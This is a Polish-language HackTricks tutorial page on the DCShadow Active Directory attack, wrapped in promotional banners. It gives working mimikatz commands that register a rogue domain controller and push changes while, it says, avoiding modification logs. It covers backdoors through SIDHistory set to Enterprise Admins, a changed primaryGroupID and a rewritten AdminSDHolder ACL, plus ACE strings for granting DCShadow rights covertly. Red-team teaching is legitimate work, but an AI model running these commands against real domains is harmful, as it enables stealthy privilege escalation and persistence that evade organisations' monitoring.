<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


# DCShadow

Rejestruje **nowy kontroler domeny** w AD i używa go do **wprowadzania atrybutów** (SIDHistory, SPN...) na określone obiekty **bez** pozostawiania jakichkolwiek **logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień DA i znajdować się w **głównym domenie**.\
Należy zauważyć, że jeśli użyjesz nieprawidłowych danych, pojawią się dość brzydkie logi.

Aby przeprowadzić atak, potrzebujesz 2 instancji mimikatz. Jedna z nich uruchomi serwery RPC z uprawnieniami SYSTEM (musisz tutaj wskazać zmiany, które chcesz przeprowadzić), a druga instancja będzie używana do wprowadzania wartości:

{% code title="mimikatz1 (serwery RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - Wymaga DA lub podobnego" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Zauważ, że **`elevate::token`** nie zadziała w sesji `mimikatz1`, ponieważ podnosi uprawnienia wątku, ale musimy podnieść **uprawnienia procesu**.\
Możesz również wybrać obiekt "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Możesz wprowadzać zmiany z konta DA lub z konta użytkownika o minimalnych uprawnieniach:

* W obiekcie **domeny**:
* _DS-Install-Replica_ (Dodaj/Usuń replikę w domenie)
* _DS-Replication-Manage-Topology_ (Zarządzaj topologią replikacji)
* _DS-Replication-Synchronize_ (Synchronizacja replikacji)
* Obiekt **Sites** (i jego dzieci) w kontenerze **Configuration**:
* _CreateChild i DeleteChild_
* Obiekt **komputera, który jest zarejestrowany jako DC**:
* _WriteProperty_ (Nie Write)
* **Obiekt docelowy**:
* _WriteProperty_ (Nie Write)

Możesz użyć [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), aby nadać te uprawnienia nieuprzywilejowanemu użytkownikowi (zauważ, że zostaną pozostawione pewne logi). Jest to znacznie bardziej restrykcyjne niż posiadanie uprawnień DA.\
Na przykład: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Oznacza to, że nazwa użytkownika _**student1**_, gdy jest zalogowany na maszynie _**mcorp-student1**_, ma uprawnienia DCShadow dla obiektu _**root1user**_.

## Używanie DCShadow do tworzenia tylnych drzwi

{% code title="Ustawienie użytkownika w SIDHistory jako Enterprise Admins" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="Zmień PrimaryGroupID (ustaw użytkownika jako członka Administratorów domeny)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Modyfikuj ntSecurityDescriptor AdminSDHolder (przyznaj pełną kontrolę użytkownikowi)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Nadaj uprawnienia DCShadow przy użyciu DCShadow (bez zmieniania logów uprawnień)

Musimy dodać następujące ACE z SID naszego użytkownika na końcu:

* Na obiekcie domeny:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDUżytkownika)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDUżytkownika)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDUżytkownika)`
* Na obiekcie komputera atakującego: `(A;;WP;;;SIDUżytkownika)`
* Na obiekcie docelowego użytkownika: `(A;;WP;;;SIDUżytkownika)`
* Na obiekcie Sites w kontenerze Configuration: `(A;CI;CCDC;;;SIDUżytkownika)`

Aby uzyskać bieżące ACE obiektu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Zauważ, że w tym przypadku musisz dokonać **kilku zmian,** a nie tylko jednej. Więc w sesji **mimikatz1** (serwer RPC) użyj parametru **`/stack` z każdą zmianą,** którą chcesz wprowadzić. W ten sposób będziesz musiał wykonać tylko jedno **`/push`** aby wykonać wszystkie zablokowane zmiany na podrobionym serwerze.



[**Więcej informacji na temat DCShadow na stronie ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
